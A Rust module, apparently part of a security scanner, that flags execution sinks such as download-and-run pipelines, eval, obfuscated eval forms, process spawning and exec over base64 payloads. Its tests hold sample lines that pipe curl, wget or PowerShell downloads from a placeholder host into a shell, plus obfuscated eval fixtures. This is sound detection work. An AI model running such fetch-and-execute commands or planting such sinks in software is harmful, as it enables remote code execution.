//! Execution sinks (spec D2.4, D2.3 `eval`/`download_and_run`): eval and `new Function`,
//! obfuscated sinks, process spawning, decoders, download-and-run, and the
//! exec-over-base64-literal combo input.

use super::context::{
    self, find_any, find_call, find_word, find_word_from, Cmd, Lang, T_DECODE, T_EVAL, T_NET,
    T_SHELL, T_SPAWN,
};
use super::{FileOut, Severity, Signal};

/// Commands a download can be piped or substituted into.
const SHELLS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "fish",
    "ash",
    "python",
    "python2",
    "python3",
    "node",
    "nodejs",
    "perl",
    "ruby",
    "php",
    "pwsh",
    "powershell",
    "source",
    "iex",
    "deno",
    "bun",
];
/// Tools that fetch remote content.
const DOWNLOADERS: &[&str] = &["curl", "wget"];
/// Words that skip ahead to the real command after a pipe (`| sudo -E bash`).
const PREFIX_WORDS: &[&str] = &["sudo", "env", "exec", "command", "nohup", "time", "doas"];
/// Base64 literal length that turns an exec sink into a combo (spec D2.4).
const B64_LITERAL: usize = 64;
/// A literal decoding to at least this printable ratio is code or text, not key or hash bytes.
const TEXT_RATIO: f64 = 0.85;

pub(super) fn scan_cmd(cmd: &Cmd<'_>, out: &mut FileOut) {
    let bits = cmd.bits;
    if bits & (T_EVAL | T_SPAWN | T_SHELL | T_NET | T_DECODE) == 0 {
        return;
    }
    let lower = cmd.lower();
    let ctx = cmd.ctx();
    let lang = cmd.lang();
    let line = |off: usize| Some(cmd.line_at(off));
    // A language-level sink inside a string or comment is code-as-data (a help text, a rule
    // table, a command built for a remote host): it warns and never feeds a combo.
    let quoted = |off: usize| cmd.quoted(off);
    let mut sink: Option<(usize, bool)> = None;

    if bits & T_NET != 0 {
        if let Some(off) = download_and_run(lower) {
            out.emit("download_and_run", Severity::High, line(off), ctx);
            sink.get_or_insert((off, false));
        }
    }
    if bits & (T_EVAL | T_SPAWN | T_SHELL) != 0 {
        let shell_like = lang != Lang::Js && lang != Lang::Python && lang != Lang::Rust;
        // Shell-level execution needs a pipe, a `-c` style flag or a shell `eval`.
        let shell_shape = lower.contains('|')
            || lower.contains(" -")
            || (lang == Lang::Shell && bits & T_EVAL != 0);
        if shell_like && bits & T_SHELL != 0 && shell_shape {
            if let Some(off) = shell_exec(lower, lang == Lang::Shell) {
                out.emit("shell_eval", Severity::Info, line(off), ctx);
                sink.get_or_insert((off, quoted(off)));
            }
        }
        let evals = lang != Lang::Shell && bits & T_EVAL != 0;
        if evals {
            if let Some(off) = eval_call(cmd) {
                let q = quoted(off);
                out.emit("eval", grade_sink(q), line(off), ctx);
                if !q {
                    out.signal(Signal::Eval(cmd.line_at(off)), ctx);
                }
                sink.get_or_insert((off, q));
            }
            if let Some(off) = obfuscated(lower, lang) {
                let q = quoted(off);
                out.emit("obfuscated_sink", grade_sink(q), line(off), ctx);
                sink.get_or_insert((off, q));
            }
            if let Some(off) = find_call(lower, "createrequire", true) {
                out.emit("create_require", Severity::Info, line(off), ctx);
            }
        }
        // JS `exec(` is child_process exec, so eval-family words also wake the spawn check.
        let spawns = bits & T_SPAWN != 0 || (lang == Lang::Js && bits & T_EVAL != 0);
        if lang != Lang::Shell && spawns {
            if let Some(off) = spawn(lower, lang) {
                out.emit("child_process", Severity::Info, line(off), ctx);
                sink.get_or_insert((off, quoted(off)));
            }
        }
    }
    let decoder = if bits & T_DECODE != 0 {
        decoder(lower)
    } else {
        None
    };
    if let Some(off) = decoder {
        out.emit("decoder", Severity::Info, line(off), ctx);
        if !quoted(off) {
            out.signal(Signal::Decoder(cmd.line_at(off)), ctx);
        }
    }
    if let Some((off, q)) = sink {
        if !q {
            out.signal(Signal::Sink(cmd.line_at(off)), ctx);
        }
        if decoder.is_some() {
            out.emit("exec_decode", grade_sink(q), line(off), ctx);
        }
        // A real base64 payload next to a sink is the payload itself, quoted sink or not
        // (Google's `'{encoded_script}'` placeholder is no literal and stays a warning).
        if b64_payload(cmd.orig(), decoder.is_some()) {
            out.emit("exec_b64_literal", Severity::High, line(off), ctx);
            out.signal(Signal::ExecB64(cmd.line_at(off)), ctx);
        }
    }
}

/// HIGH for a live sink, WARN for one quoted in a string or comment.
fn grade_sink(quoted: bool) -> Severity {
    if quoted {
        Severity::Warn
    } else {
        Severity::High
    }
}

/// Downloaded content piped or substituted into a shell or interpreter, or eval'd directly.
fn download_and_run(s: &str) -> Option<usize> {
    if s.contains('|') {
        for tool in DOWNLOADERS {
            let mut from = 0;
            while let Some(p) = find_word_from(s, tool, from) {
                // One pipeline is short; a bounded window keeps huge one-line files linear.
                let window = &s[p..context::floor_char_boundary(s, p + 2048)];
                if pipes_into_shell(window) {
                    return Some(p);
                }
                from = p + tool.len();
            }
        }
    }
    for open in ["$(", "<(", "`"] {
        let mut from = 0;
        while let Some(q) = s.get(from..).and_then(|r| r.find(open)).map(|q| q + from) {
            let inner = s[q + open.len()..].trim_start();
            let fetches = DOWNLOADERS.iter().any(|t| find_word(inner, t) == Some(0));
            let before = &s[..q];
            let runs = SHELLS
                .iter()
                .chain(["eval"].iter())
                .any(|sh| find_word(before, sh).is_some())
                || before.trim_end().ends_with(" .")
                || before.trim_end() == ".";
            if fetches && runs {
                return Some(q);
            }
            from = q + open.len();
        }
    }
    let iex = find_word(s, "iex").or_else(|| s.find("invoke-expression"));
    let web = find_word(s, "iwr").is_some()
        || find_word(s, "irm").is_some()
        || find_any(
            s,
            &["invoke-webrequest", "invoke-restmethod", "downloadstring"],
        )
        .is_some();
    if let (Some(p), true) = (iex, web) {
        return Some(p);
    }
    let fetched = find_any(
        s,
        &[
            "urlopen(",
            "requests.get(",
            "fetch(",
            "http.get(",
            "https.get(",
            "axios.get(",
        ],
    );
    let run = find_call(s, "eval", false).or_else(|| find_call(s, "exec", false));
    match (fetched, run) {
        (Some(f), Some(e)) => Some(f.min(e)),
        _ => None,
    }
}

/// True when a pipe stage after the start of `s` runs a shell or interpreter.
fn pipes_into_shell(s: &str) -> bool {
    let b = s.as_bytes();
    let mut from = 0;
    while let Some(p) = s.get(from..).and_then(|r| r.find('|')).map(|p| p + from) {
        from = p + 1;
        let double = b.get(p + 1) == Some(&b'|') || (p > 0 && b[p - 1] == b'|');
        if double {
            continue;
        }
        let mut rest = s[p + 1..].trim_start();
        loop {
            let end = rest.find(char::is_whitespace).unwrap_or(rest.len());
            let word = &rest[..end];
            let skip = PREFIX_WORDS.contains(&word)
                || (word.len() > 1 && word.starts_with('-'))
                || (word.contains('=') && !word.starts_with('='));
            if skip && end < rest.len() {
                rest = rest[end..].trim_start();
                continue;
            }
            let word = word.trim_matches(|c: char| matches!(c, '\'' | '"' | '`' | ')' | ';'));
            let base = word.rsplit('/').next().unwrap_or(word);
            if SHELLS.contains(&base) {
                return true;
            }
            break;
        }
    }
    false
}

/// Shell-level execution of a string: `eval …` (shell code only), `sh -c`, or a pipe into a shell.
fn shell_exec(s: &str, shell: bool) -> Option<usize> {
    let mut found: Vec<usize> = Vec::new();
    if shell {
        if let Some(p) = find_word(s, "eval") {
            if !s[p + 4..].trim_start().starts_with('(') {
                found.push(p);
            }
        }
    }
    for sh in ["sh", "bash", "zsh", "dash", "ksh"] {
        let mut from = 0;
        while let Some(p) = find_word_from(s, sh, from) {
            from = p + sh.len();
            let flag = s[from..].split_whitespace().next().unwrap_or("");
            if flag.starts_with('-') && !flag.starts_with("--") && flag.contains('c') {
                found.push(p);
                break;
            }
        }
    }
    if pipes_into_shell(s) {
        found.extend(s.find('|'));
    }
    found.into_iter().min()
}

/// `eval(` (not a method), `window.eval(`, or JS `Function(` / `new Function(` other than the
/// `Function('return this')` global-object idiom.
fn eval_call(cmd: &Cmd<'_>) -> Option<usize> {
    let lower = cmd.lower();
    // In prose and data (`Lang::Other`), "eval (the …)" is a word, so the call needs `eval(`.
    let call = if cmd.lang() == Lang::Other {
        lower.match_indices("eval(").map(|(p, _)| p).find(|&p| {
            p == 0
                || !(context::is_ident(lower.as_bytes()[p - 1]) || lower.as_bytes()[p - 1] == b'.')
        })
    } else {
        find_call(lower, "eval", false)
    };
    let direct =
        call.or_else(|| find_any(lower, &["window.eval(", "globalthis.eval(", "global.eval("]));
    if direct.is_some() {
        return direct;
    }
    if matches!(cmd.lang(), Lang::Js | Lang::Other) {
        return new_function(cmd.orig());
    }
    None
}

fn new_function(orig: &str) -> Option<usize> {
    let b = orig.as_bytes();
    let mut from = 0;
    while let Some(p) = orig
        .get(from..)
        .and_then(|r| r.find("Function"))
        .map(|p| p + from)
    {
        from = p + "Function".len();
        let left = p == 0 || (!context::is_ident(b[p - 1]) && b[p - 1] != b'.');
        // `Function(` directly, or `new Function (`: prose like "Random Function (VRF)" is not
        // a call.
        let constructed = orig[..p].trim_end().ends_with("new");
        let rest = if constructed {
            orig[from..].trim_start()
        } else {
            &orig[from..]
        };
        let Some(arg) = rest.strip_prefix('(') else {
            continue;
        };
        let arg = arg.trim_start();
        let idiom = arg.starts_with("'return this'") || arg.starts_with("\"return this\"");
        if left && !idiom {
            return Some(p);
        }
    }
    None
}

/// Indirect or obfuscated execution: computed eval, `constructor.constructor`, `data:` imports,
/// string timers, the `vm` module; Python `exec`, `marshal`/`pickle` loads, `__import__`.
fn obfuscated(s: &str, lang: Lang) -> Option<usize> {
    let mut found: Vec<Option<usize>> = Vec::new();
    if matches!(lang, Lang::Js | Lang::Other) {
        found.push(find_any(
            s,
            &[
                "constructor.constructor",
                "['constructor']",
                "[\"constructor\"]",
                "import('data:",
                "import(\"data:",
                "import(`data:",
                "vm.runin",
                "require('vm')",
                "require(\"vm\")",
                "require('node:vm')",
                "require(\"node:vm\")",
                "new vm.script",
            ],
        ));
        for timer in ["settimeout", "setinterval"] {
            if let Some(p) = find_call(s, timer, true) {
                let arg = s[p + timer.len()..].trim_start();
                let arg = arg.strip_prefix('(').unwrap_or(arg).trim_start();
                if arg.starts_with(['\'', '"', '`']) {
                    found.push(Some(p));
                }
            }
        }
        for global in ["globalthis[", "window[", "global[", "self["] {
            if let Some(p) = s.find(global) {
                if s[p + global.len()..]
                    .trim_start()
                    .starts_with(['\'', '"', '`'])
                {
                    found.push(Some(p));
                }
            }
        }
        found.push(concat_member(s));
    }
    if matches!(lang, Lang::Python | Lang::Other) {
        found.push(find_call(s, "exec", false));
        found.push(find_call(s, "__import__", false));
        found.push(find_any(
            s,
            &[
                "marshal.loads(",
                "pickle.loads(",
                "builtins.exec",
                "getattr(__builtins__",
                "getattr(builtins",
            ],
        ));
    }
    found.into_iter().flatten().min()
}

/// A bracket member built by string concatenation: `x['ev' + 'al']` — a `+` operator, outside
/// quotes, between two string literals, inside the brackets.
fn concat_member(s: &str) -> Option<usize> {
    let mut from = 0;
    while let Some(p) = s.get(from..).and_then(|r| r.find('[')).map(|p| p + from) {
        from = p + 1;
        let window = &s[p + 1..context::floor_char_boundary(s, p + 81)];
        let body = &window[..window.find(']').unwrap_or(window.len())];
        if body.starts_with(['\'', '"']) && joins_literals(body) {
            return Some(p);
        }
    }
    None
}

fn joins_literals(body: &str) -> bool {
    let b = body.as_bytes();
    let mut quote = 0u8;
    for (i, &c) in b.iter().enumerate() {
        if quote != 0 {
            if c == quote {
                quote = 0;
            }
            continue;
        }
        match c {
            b'\'' | b'"' => quote = c,
            b'+' => {
                let before = body[..i].trim_end();
                let after = body[i + 1..].trim_start();
                if before.ends_with(['\'', '"']) && after.starts_with(['\'', '"']) {
                    return true;
                }
            }
            _ => {}
        }
    }
    false
}

/// Process spawning per language (inventory, and a sink for combos).
fn spawn(s: &str, lang: Lang) -> Option<usize> {
    let mut found: Vec<Option<usize>> = Vec::new();
    if matches!(lang, Lang::Js | Lang::Other) {
        found.push(find_any(
            s,
            &[
                "child_process",
                "execsync",
                "spawnsync",
                "execfilesync",
                "shelljs",
                "execa(",
            ],
        ));
        found.push(find_call(s, "execfile", true));
        found.push(find_call(s, "spawn", false));
        found.push(find_call(s, "fork", false));
        if lang == Lang::Js {
            found.push(find_call(s, "exec", false));
        }
    }
    if matches!(lang, Lang::Python | Lang::Other) {
        found.push(find_any(
            s,
            &[
                "subprocess.",
                "os.system(",
                "os.popen(",
                "os.exec",
                "os.spawn",
                "pty.spawn(",
                "commands.getoutput(",
            ],
        ));
    }
    if matches!(lang, Lang::Rust | Lang::Other) {
        found.push(find_any(s, &["command::new(", "process::command"]));
    }
    if lang == Lang::Other {
        found.push(find_any(
            s,
            &[
                "exec.command(",
                "runtime.getruntime().exec(",
                "shell_exec(",
                "proc_open(",
                "passthru(",
            ],
        ));
    }
    found.into_iter().flatten().min()
}

/// Base64 / hex / char-code decoding.
fn decoder(s: &str) -> Option<usize> {
    let mut found = vec![
        find_call(s, "atob", true),
        find_any(
            s,
            &[
                "b64decode(",
                "decodebytes(",
                "a2b_base64(",
                "fromcharcode(",
                "fromhex(",
                "codecs.decode(",
                "base64 -d",
                "base64 --decode",
                "xxd -r",
                "openssl base64 -d",
                "openssl enc -d",
                "base64.decode(",
                "base64::decode",
                "base64_decode(",
            ],
        ),
    ];
    if let Some(p) = s.find("buffer.from(") {
        let rest = &s[p..];
        if ["'base64'", "\"base64\"", "'hex'", "\"hex\""]
            .iter()
            .any(|e| rest.contains(e))
        {
            found.push(Some(p));
        }
    }
    found.into_iter().flatten().min()
}

/// A quoted base64 literal of 64+ characters that is not hex and, unless a decoder sits in the
/// same command, decodes to text (so key, signature and hash literals do not count).
fn b64_payload(orig: &str, decoder: bool) -> bool {
    context::quoted_b64_literals(orig, B64_LITERAL)
        .into_iter()
        .any(|lit| {
            !context::is_hex(lit.trim_end_matches('='))
                && (decoder
                    || context::b64_decode(lit.as_bytes()).is_some_and(|bytes| {
                        bytes.len() >= 32 && context::printable_ratio(&bytes) >= TEXT_RATIO
                    }))
        })
}

#[cfg(test)]
mod tests {
    use super::super::testkit::*;
    use super::super::{grade, Ctx, Grade, Severity};

    fn b64(s: &str) -> String {
        const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let bytes = s.as_bytes();
        let mut out = String::new();
        for c in bytes.chunks(3) {
            let n = (u32::from(c[0]) << 16)
                | (u32::from(*c.get(1).unwrap_or(&0)) << 8)
                | u32::from(*c.get(2).unwrap_or(&0));
            for k in 0..4 {
                if k <= c.len() {
                    out.push(A[((n >> (18 - 6 * k)) & 63) as usize] as char);
                } else {
                    out.push('=');
                }
            }
        }
        out
    }

    #[test]
    fn pipe_and_substitution_forms_are_download_and_run() {
        for line in [
            "curl -fsSL https://example.invalid/x | sudo -E bash",
            "wget -qO- https://example.invalid/i | sh",
            "bash <(curl -s https://example.invalid/i)",
            "sh -c \"$(curl -fsSL https://example.invalid/i)\"",
            "curl -s https://example.invalid/x | tee /tmp/x | python3 -",
            "iex (iwr https://example.invalid/a.ps1)",
        ] {
            let r = scan_one("install.sh", &format!("#!/bin/sh\n{line}\n"));
            let f = hits(&r, "download_and_run");
            assert_eq!(f.len(), 1, "{line}: {r:?}");
            assert_eq!((f[0].sev, f[0].line), (Severity::High, Some(2)), "{line}");
        }
    }

    #[test]
    fn download_without_shell_is_not_download_and_run() {
        let r = scan_one(
            "get.sh",
            "curl -fsSL https://example.invalid/a.tgz | tar xz\nwget https://example.invalid/f -O f\n",
        );
        assert!(!has(&r, "download_and_run"), "{r:?}");
    }

    #[test]
    fn eval_respects_word_and_member_boundaries() {
        let r = scan_one(
            "a.py",
            "docs = retrieval(q)\nmodel.eval()\nv = ast.literal_eval(s)\n",
        );
        assert!(!has(&r, "eval"), "{r:?}");
        let r = scan_one("b.js", "const ok = 1;\nconst v = eval(code);\n");
        let f = hits(&r, "eval");
        assert_eq!((f[0].sev, f[0].line), (Severity::High, Some(2)), "{r:?}");
    }

    #[test]
    fn prose_eval_word_is_not_a_call() {
        let yml = "on:\n  workflow_dispatch:\n    inputs:\n      skill:\n        description: \"Skill to eval (blank = all skills)\"\n# Nothing runs when there are no skills to eval (the seeder skips)\n";
        assert!(!has(&scan_one("qa-eval.yml", yml), "eval"));
        assert!(has(
            &scan_one("notes.yml", "run: node -e 'eval(x)'\n"),
            "eval"
        ));
    }

    #[test]
    fn new_function_but_not_the_return_this_idiom() {
        let r = scan_one("a.js", "const f = new Function('a', body);\n");
        assert!(has(&r, "eval"), "{r:?}");
        let r = scan_one(
            "b.js",
            "var g = Function('return this')();\nfunction foo() { return 1; }\nconst t: Function = x;\n",
        );
        assert!(!has(&r, "eval"), "{r:?}");
    }

    #[test]
    fn shell_eval_and_pipe_into_shell_are_info() {
        let r = scan_one(
            "setup.sh",
            "eval \"$(ssh-agent -s)\"\necho done | sh\nbash -c 'echo hi'\n",
        );
        assert!(has(&r, "shell_eval"), "{r:?}");
        assert_eq!(grade(&r), Grade::Clean, "{r:?}");
    }

    #[test]
    fn obfuscated_sinks_are_high() {
        for (name, line) in [
            ("a.js", "globalThis['ev' + 'al'](x)"),
            ("a.js", "await import('data:text/javascript,1')"),
            ("a.js", "setTimeout(\"run()\", 10)"),
            ("a.js", "[]['constructor']['constructor'](s)()"),
            ("a.js", "require('vm').runInNewContext(s)"),
            ("a.py", "exec(code)"),
            ("a.py", "obj = pickle.loads(blob)"),
            ("a.py", "m = __import__('os')"),
        ] {
            let r = scan_one(name, &format!("{line}\n"));
            let f = hits(&r, "obfuscated_sink");
            assert_eq!(f.len(), 1, "{line}: {r:?}");
            assert_eq!(f[0].sev, Severity::High, "{line}");
        }
        let r = scan_one(
            "b.js",
            "setTimeout(() => go(), 10)\nconst m = re.exec(s)\nconst n = pattern.exec(t)\n",
        );
        assert!(!has(&r, "obfuscated_sink"), "{r:?}");
    }

    #[test]
    fn process_spawning_is_info() {
        let r = scan_one(
            "a.js",
            "const { execSync } = require('child_process');\nexecSync('ls');\n",
        );
        assert!(has(&r, "child_process"), "{r:?}");
        assert_eq!(grade(&r), Grade::Clean);
        let r = scan_one("a.py", "subprocess.run(['ls'])\n");
        assert!(has(&r, "child_process"), "{r:?}");
    }

    #[test]
    fn exec_over_decoder_is_high_and_the_quoted_google_shape_warns() {
        let r = scan_one("a.py", "exec(base64.b64decode(s))\n");
        assert_eq!(hits(&r, "exec_decode")[0].sev, Severity::High, "{r:?}");
        assert!(has(&r, "decoder"), "{r:?}");
        // google/skills jump_host_engine.py:199 builds the call as a string for a remote host.
        let google = "def run(self, script):\n    encoded_script = base64.b64encode(script.encode('utf-8')).decode('ascii')\n    decoded_expr = f\"exec(base64.b64decode('{encoded_script}').decode('utf-8'))\"\n    return decoded_expr\n";
        let r = scan_one("jump_host_engine.py", google);
        let f = hits(&r, "exec_decode");
        assert_eq!(
            (f[0].sev, f[0].ctx, f[0].line),
            (Severity::Warn, Ctx::Code, Some(3)),
            "{r:?}"
        );
        assert!(!has(&r, "exec_b64_literal"), "{r:?}");
        assert!(r.combos.is_empty(), "{r:?}");
        assert_eq!(grade(&r), Grade::Warn);
    }

    #[test]
    fn sinks_in_strings_and_comments_warn_and_feed_no_combo() {
        let table = "DANGEROUS = {\n    \"eval\": \"eval() has unpredictable timing\",\n    \"atob\": \"atob(x) decodes\",\n}\n";
        let r = scan_one("rules.py", table);
        assert!(
            hits(&r, "eval").iter().all(|f| f.sev == Severity::Warn),
            "{r:?}"
        );
        assert!(r.combos.is_empty(), "{r:?}");
        let help =
            "p.add_argument(\"--timeout\", help=\"Timeout per functional eval (seconds)\")\n";
        assert!(hits(&scan_one("cli.py", help), "eval")
            .iter()
            .all(|f| f.sev == Severity::Warn));
        let jsdoc = "/**\n * Verifiable Random Function (VRF) for on-chain randomness.\n * Never eval(input) here.\n */\nexport const x = 1;\n";
        let r = scan_one("vrf.ts", jsdoc);
        assert!(
            hits(&r, "eval").iter().all(|f| f.sev == Severity::Warn),
            "{r:?}"
        );
        let r = scan_one("c.ts", "// eval(x) is banned\nconst y = atob(z);\n");
        assert!(r.combos.is_empty(), "{r:?}");
    }

    #[test]
    fn string_arrays_are_not_concatenated_members() {
        let r = scan_one(
            "install.js",
            "const chars = ['.', '.', '\u{00B7}', '\u{00B7}', '*', '+'];\nconst s = self['ev' + 'al'];\n",
        );
        let f = hits(&r, "obfuscated_sink");
        assert_eq!(f.len(), 1, "{r:?}");
        assert_eq!(f[0].line, Some(2));
        // A multi-byte character right at the window edge must not panic.
        let edge = format!("x['{}\u{00B7}' + 'y']\n", "a".repeat(77));
        let _ = scan_one("edge.js", &edge);
    }

    #[test]
    fn exec_over_long_base64_literal_is_a_combo() {
        let payload = b64(&"console.log('inert fixture: nothing to see');".repeat(3));
        let r = scan_one(
            "w.js",
            &format!("eval(\"global.o=1;\"+atob('{payload}'))\n"),
        );
        assert!(has(&r, "exec_b64_literal"), "{r:?}");
        assert!(combo(&r, "exec_b64_literal").is_some(), "{r:?}");
        assert_eq!(grade(&r), Grade::Block);
    }

    #[test]
    fn signature_or_hex_literal_beside_exec_is_not_a_payload() {
        let sig = "5VERv8NMvzbJMEkV8xnrLkEaWRtSz9CosKDYjCJjBRnbJLgp8uirBgmQpjKhoR4tjF3ZpRzrFmBV6UjKdiSZkQUW";
        let hex = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08";
        let r = scan_one(
            "a.js",
            &format!("execSync(`solana confirm {sig}`)\nexecSync('verify \"{hex}\"')\nexecSync(\"x '{sig}'\")\n"),
        );
        assert!(!has(&r, "exec_b64_literal"), "{r:?}");
    }

    #[test]
    fn fenced_payload_in_docs_is_warn_and_never_a_combo() {
        let payload = b64(&"console.log('inert fixture: nothing to see');".repeat(3));
        let r = scan_one(
            "SKILL.md",
            &format!("# S\n```js\neval(atob('{payload}'))\n```\n"),
        );
        assert!(r.combos.is_empty(), "{r:?}");
        assert_eq!(grade(&r), Grade::Warn, "{r:?}");
    }
}
